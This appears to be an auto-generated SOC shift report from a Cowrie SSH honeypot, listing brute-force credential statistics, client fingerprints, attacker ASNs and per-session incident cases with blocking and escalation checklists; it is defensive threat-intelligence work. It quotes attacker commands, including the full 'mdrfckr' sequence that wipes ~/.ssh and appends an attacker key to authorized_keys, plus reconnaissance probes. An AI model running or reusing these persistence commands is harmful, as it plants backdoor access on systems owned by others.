# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-11 |
| **Generated At** | 2026-11-11T03:42:40Z |
| **Shift Time** | 03:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **106** |
| False Positives Filtered | **10** (8.6%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **19** |
| High Severity Cases | **85** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **31** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1584** |
| Unique Credential Pairs | **976** |
| Unique Usernames | **150** |
| Unique Passwords | **877** |
| Successful Auth Pairs | **1543** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1202 |
| `admin` | 46 |
| `test` | 19 |
| `ubuntu` | 19 |
| `user` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 31 |
| `admin` | 18 |
| `wmL-o` | 11 |
| `1234` | 10 |
| `admin123` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 8 |
| `root` | `admin` | 8 |
| `root` | `toor` | 5 |
| `root` | `` | 5 |
| `admin` | `vivo12345` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Ahmed@500` | `109.160.32.120` | 2026-11-11T00:00:01 |
| `yang` | `123456` | `109.160.32.120` | 2026-11-11T00:00:05 |
| `root` | `P@ssword1` | `109.160.32.120` | 2026-11-11T00:00:09 |
| `root` | `temp12345678` | `109.160.32.120` | 2026-11-11T00:00:13 |
| `root` | `Dh@ka2025??` | `109.160.32.120` | 2026-11-11T00:00:17 |
| `root` | `admin6767#` | `109.160.32.120` | 2026-11-11T00:00:21 |
| `test` | `1qa@WSX3edc` | `109.160.32.120` | 2026-11-11T00:00:26 |
| `root` | `toor` | `109.160.32.120` | 2026-11-11T00:00:30 |
| `root` | `123$qweR` | `109.160.32.120` | 2026-11-11T00:00:38 |
| `root` | `qcN>Kvt>48wyd+bQY3N.{xsnx` | `109.160.32.120` | 2026-11-11T00:00:42 |
| `support` | `supportAtlanta` | `10.0.0.73` | 2026-11-11T00:00:44 |
| `root` | `deploy` | `109.160.32.120` | 2026-11-11T00:00:46 |
| `linos` | `sammy2026` | `109.160.32.120` | 2026-11-11T00:00:50 |
| `pakar` | `pakar` | `109.160.32.120` | 2026-11-11T00:00:54 |
| `root` | `numiit27` | `109.160.32.120` | 2026-11-11T00:00:59 |
| `root` | `` | `138.226.239.234` | 2026-11-11T00:01:01 |
| `root` | `p@ssw0rd` | `109.160.32.120` | 2026-11-11T00:01:03 |
| `root` | `issabel2026root` | `109.160.32.120` | 2026-11-11T00:01:07 |
| `root` | `TuviejaenTanga15` | `109.160.32.120` | 2026-11-11T00:01:11 |
| `user2` | `sifre1degil` | `109.160.32.120` | 2026-11-11T00:01:15 |
_… 1523 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 84 |
| AsyncSSH (Python) | 2 |
| libssh | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 68 | 3 |
| `0a07365cc01f...` | Generic scanner | 5 | 3 |
| `7d01d047ace6...` | Mirai/variant | 4 | 4 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `d1c5d296d532...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 68 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 5 | 3 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 4 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `d1c5d296d532...` | AsyncSSH (Python) | 2 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **72** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.40.145.110`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 23 | HIGH |
| `AS12322` | Free SAS | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS198364` | BANATSYNC SRL | 2 | HIGH |
| `AS141216` | GREAT GOLDEN HORSE COMPANY LIMITED | 1 | LOW |
| `AS35297` | Dataline LLC | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4b6b3287ea2c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]120` |
| **First Seen** | 2026-11-11 00:00 |
| **Last Seen** | 2026-11-11 00:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:00:00` | `cowrie.session.connect` |
| `2026-11-11 00:00:00` | `cowrie.client.version` |
| `2026-11-11 00:00:00` | `cowrie.client.kex` |
| `2026-11-11 00:00:01` | `cowrie.login.success` |
| `2026-11-11 00:00:02` | `cowrie.session.params` |
| `2026-11-11 00:00:02` | `cowrie.command.input` |
| `2026-11-11 00:00:02` | `cowrie.log.closed` |
| `2026-11-11 00:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]120` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9064d2f7e5cb

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-11 00:01 |
| **Last Seen** | 2026-11-11 00:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:01:01` | `cowrie.session.connect` |
| `2026-11-11 00:01:01` | `cowrie.client.version` |
| `2026-11-11 00:01:01` | `cowrie.client.kex` |
| `2026-11-11 00:01:01` | `cowrie.login.success` |
| `2026-11-11 00:01:01` | `cowrie.direct-tcpip.request` |
| `2026-11-11 00:01:02` | `cowrie.direct-tcpip.ja4` |
| `2026-11-11 00:01:02` | `cowrie.direct-tcpip.data` |
| `2026-11-11 00:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96a6f65c6e5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-11 00:01 |
| **Last Seen** | 2026-11-11 00:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:01:25` | `cowrie.session.connect` |
| `2026-11-11 00:01:25` | `cowrie.client.version` |
| `2026-11-11 00:01:25` | `cowrie.client.kex` |
| `2026-11-11 00:01:25` | `cowrie.login.success` |
| `2026-11-11 00:01:25` | `cowrie.direct-tcpip.request` |
| `2026-11-11 00:01:25` | `cowrie.direct-tcpip.ja4` |
| `2026-11-11 00:01:25` | `cowrie.direct-tcpip.data` |
| `2026-11-11 00:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea0178fdb306

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-11 00:05 |
| **Last Seen** | 2026-11-11 00:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:05:37` | `cowrie.session.connect` |
| `2026-11-11 00:05:37` | `cowrie.client.version` |
| `2026-11-11 00:05:38` | `cowrie.client.kex` |
| `2026-11-11 00:05:38` | `cowrie.login.success` |
| `2026-11-11 00:05:38` | `cowrie.direct-tcpip.request` |
| `2026-11-11 00:05:38` | `cowrie.direct-tcpip.ja4` |
| `2026-11-11 00:05:38` | `cowrie.direct-tcpip.data` |
| `2026-11-11 00:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05d31030c95

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:10 |
| **Last Seen** | 2026-11-11 00:10 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_21fb10e593d8dbe803647554dbee47d0_small_control'"'"' '"'"'check_21fb10e593d8dbe803647554dbee47d0'"'"'', printf '\n%s|%s\n' 'check_21fb10e593d8dbe803647554dbee47d0_small_control' 'check_21fb10e593d8dbe803647554dbee47d0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_21fb10e593d8dbe803647554dbee47d0_small_math'"'"' "$((724*362+67))"', (724*362+67, printf '\n%s|%s\n' 'check_21fb10e593d8dbe803647554dbee47d0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:10:06` | `cowrie.session.connect` |
| `2026-11-11 00:10:07` | `cowrie.client.version` |
| `2026-11-11 00:10:07` | `cowrie.client.kex` |
| `2026-11-11 00:10:14` | `cowrie.login.success` |
| `2026-11-11 00:10:17` | `cowrie.client.size` |
| `2026-11-11 00:10:18` | `cowrie.session.params` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| `2026-11-11 00:10:19` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d73c7abb129

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:13 |
| **Last Seen** | 2026-11-11 00:13 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6a71de0634a4d40fe92221e44bc2eadc_small_control'"'"' '"'"'check_6a71de0634a4d40fe92221e44bc2eadc'"'"'', printf '\n%s|%s\n' 'check_6a71de0634a4d40fe92221e44bc2eadc_small_control' 'check_6a71de0634a4d40fe92221e44bc2eadc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6a71de0634a4d40fe92221e44bc2eadc_small_math'"'"' "$((331*352+90))"', (331*352+90, printf '\n%s|%s\n' 'check_6a71de0634a4d40fe92221e44bc2eadc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:13:29` | `cowrie.session.connect` |
| `2026-11-11 00:13:30` | `cowrie.client.version` |
| `2026-11-11 00:13:30` | `cowrie.client.kex` |
| `2026-11-11 00:13:36` | `cowrie.login.success` |
| `2026-11-11 00:13:45` | `cowrie.client.size` |
| `2026-11-11 00:13:46` | `cowrie.session.params` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| `2026-11-11 00:13:48` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1572a7e0791a

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-11 00:15 |
| **Last Seen** | 2026-11-11 00:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:15:23` | `cowrie.session.connect` |
| `2026-11-11 00:15:23` | `cowrie.client.version` |
| `2026-11-11 00:15:23` | `cowrie.client.kex` |
| `2026-11-11 00:15:23` | `cowrie.login.success` |
| `2026-11-11 00:15:23` | `cowrie.direct-tcpip.request` |
| `2026-11-11 00:15:24` | `cowrie.direct-tcpip.ja4` |
| `2026-11-11 00:15:24` | `cowrie.direct-tcpip.data` |
| `2026-11-11 00:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a8d0952503

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:16 |
| **Last Seen** | 2026-11-11 00:17 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b9d86227577a8016b7accf299fc71e16_small_control'"'"' '"'"'check_b9d86227577a8016b7accf299fc71e16'"'"'', printf '\n%s|%s\n' 'check_b9d86227577a8016b7accf299fc71e16_small_control' 'check_b9d86227577a8016b7accf299fc71e16', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b9d86227577a8016b7accf299fc71e16_small_math'"'"' "$((718*353+47))"', (718*353+47, printf '\n%s|%s\n' 'check_b9d86227577a8016b7accf299fc71e16_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:16:46` | `cowrie.session.connect` |
| `2026-11-11 00:16:47` | `cowrie.client.version` |
| `2026-11-11 00:16:47` | `cowrie.client.kex` |
| `2026-11-11 00:16:57` | `cowrie.login.success` |
| `2026-11-11 00:17:02` | `cowrie.client.size` |
| `2026-11-11 00:17:04` | `cowrie.session.params` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| `2026-11-11 00:17:07` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb24e26c422c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:19 |
| **Last Seen** | 2026-11-11 00:20 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b5de3a1b528a376856353c943910f4bb_small_control'"'"' '"'"'check_b5de3a1b528a376856353c943910f4bb'"'"'', printf '\n%s|%s\n' 'check_b5de3a1b528a376856353c943910f4bb_small_control' 'check_b5de3a1b528a376856353c943910f4bb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b5de3a1b528a376856353c943910f4bb_small_math'"'"' "$((697*11+96))"', (697*11+96, printf '\n%s|%s\n' 'check_b5de3a1b528a376856353c943910f4bb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:19:52` | `cowrie.session.connect` |
| `2026-11-11 00:19:53` | `cowrie.client.version` |
| `2026-11-11 00:19:53` | `cowrie.client.kex` |
| `2026-11-11 00:20:01` | `cowrie.login.success` |
| `2026-11-11 00:20:06` | `cowrie.client.size` |
| `2026-11-11 00:20:08` | `cowrie.session.params` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| `2026-11-11 00:20:10` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96cd583a5a95

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:22 |
| **Last Seen** | 2026-11-11 00:23 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_234aacf5fed620edb0691a3f36a3e864_small_control'"'"' '"'"'check_234aacf5fed620edb0691a3f36a3e864'"'"'', printf '\n%s|%s\n' 'check_234aacf5fed620edb0691a3f36a3e864_small_control' 'check_234aacf5fed620edb0691a3f36a3e864', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_234aacf5fed620edb0691a3f36a3e864_small_math'"'"' "$((62*674+14))"', (62*674+14, printf '\n%s|%s\n' 'check_234aacf5fed620edb0691a3f36a3e864_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:22:59` | `cowrie.session.connect` |
| `2026-11-11 00:23:01` | `cowrie.client.version` |
| `2026-11-11 00:23:03` | `cowrie.client.kex` |
| `2026-11-11 00:23:07` | `cowrie.login.success` |
| `2026-11-11 00:23:10` | `cowrie.client.size` |
| `2026-11-11 00:23:10` | `cowrie.session.params` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| `2026-11-11 00:23:12` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908ca31cf62f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:29 |
| **Last Seen** | 2026-11-11 00:29 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_42003957dc49c7127faf2846bc709add_small_control'"'"' '"'"'check_42003957dc49c7127faf2846bc709add'"'"'', printf '\n%s|%s\n' 'check_42003957dc49c7127faf2846bc709add_small_control' 'check_42003957dc49c7127faf2846bc709add', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_42003957dc49c7127faf2846bc709add_small_math'"'"' "$((945*806+19))"', (945*806+19, printf '\n%s|%s\n' 'check_42003957dc49c7127faf2846bc709add_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:29:07` | `cowrie.session.connect` |
| `2026-11-11 00:29:08` | `cowrie.client.version` |
| `2026-11-11 00:29:08` | `cowrie.client.kex` |
| `2026-11-11 00:29:13` | `cowrie.login.success` |
| `2026-11-11 00:29:15` | `cowrie.client.size` |
| `2026-11-11 00:29:17` | `cowrie.session.params` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| `2026-11-11 00:29:18` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf21e53e8c67

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:32 |
| **Last Seen** | 2026-11-11 00:32 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_332ce9bcd373d29a82dea4e3c48f0dee_small_control'"'"' '"'"'check_332ce9bcd373d29a82dea4e3c48f0dee'"'"'', printf '\n%s|%s\n' 'check_332ce9bcd373d29a82dea4e3c48f0dee_small_control' 'check_332ce9bcd373d29a82dea4e3c48f0dee', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_332ce9bcd373d29a82dea4e3c48f0dee_small_math'"'"' "$((140*377+6))"', (140*377+6, printf '\n%s|%s\n' 'check_332ce9bcd373d29a82dea4e3c48f0dee_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:32:24` | `cowrie.session.connect` |
| `2026-11-11 00:32:24` | `cowrie.client.version` |
| `2026-11-11 00:32:24` | `cowrie.client.kex` |
| `2026-11-11 00:32:28` | `cowrie.login.success` |
| `2026-11-11 00:32:33` | `cowrie.client.size` |
| `2026-11-11 00:32:35` | `cowrie.session.params` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| `2026-11-11 00:32:37` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2553a73e3386

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:35 |
| **Last Seen** | 2026-11-11 00:35 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0f5b4f4b967d8a9942114e3f6f06332d_small_control'"'"' '"'"'check_0f5b4f4b967d8a9942114e3f6f06332d'"'"'', printf '\n%s|%s\n' 'check_0f5b4f4b967d8a9942114e3f6f06332d_small_control' 'check_0f5b4f4b967d8a9942114e3f6f06332d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0f5b4f4b967d8a9942114e3f6f06332d_small_math'"'"' "$((941*480+52))"', (941*480+52, printf '\n%s|%s\n' 'check_0f5b4f4b967d8a9942114e3f6f06332d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:35:09` | `cowrie.session.connect` |
| `2026-11-11 00:35:12` | `cowrie.client.version` |
| `2026-11-11 00:35:12` | `cowrie.client.kex` |
